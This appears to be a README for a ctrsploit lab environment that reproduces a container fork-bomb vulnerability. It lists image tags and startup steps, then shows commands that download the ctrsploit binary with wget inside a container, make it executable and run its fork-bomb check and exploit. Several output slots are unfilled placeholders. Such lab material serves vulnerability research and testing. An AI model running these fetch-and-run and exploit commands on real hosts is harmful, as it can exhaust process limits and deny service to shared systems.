# fork-bomb

| Type | Image | Notes |
| ---- | ----- | ----- |
| dqd | ghcr.io/ctrsploit/fork-bomb:latest | points to `v0.1.0` |
| dqd | ghcr.io/ctrsploit/fork-bomb:v0.1.0 | migrate from docker_archive |
| dqd | ssst0n3/docker_archive:fork-bomb_v0.1.0 | - |
| ctr | ghcr.io/ctrsploit/fork-bomb:ctr_v0.1.0 | - |
| ctr | ssst0n3/docker_archive:ctr_fork-bomb_v0.1.0 | - |

## usage

### Start and connect

```shell
$ dqd up vul/fork-bomb
$ ssh dqd-fork-bomb
```

Fallback without dqd CLI or SSH config:

```shell
$ cd vul/fork-bomb
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
$ ./ssh
```

### reproduce

terminal 1

```shell
root@fork-bomb:~# while true; do cat /proc/sys/kernel/ns_last_pid && sleep 1; done
<!-- VERIFY -->
```

terminal 2

```shell
root@fork-bomb:~# docker run -ti busybox ash
/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit vul fork-bomb c
<!-- VERIFY -->
/ # ctrsploit vul fork-bomb x
<!-- VERIFY -->
```

terminal 1

```shell
<!-- VERIFY -->
```

### versions

```shell
root@fork-bomb:~# docker version
<!-- VERIFY -->
root@fork-bomb:~# cat /etc/os-release
<!-- VERIFY -->
root@fork-bomb:~# uname -a
<!-- VERIFY -->
```

## build

```shell
make all ENV=vul/fork-bomb
```

for developers:

```dockerfile
FROM ghcr.io/ctrsploit/fork-bomb:ctr_v0.1.0
```
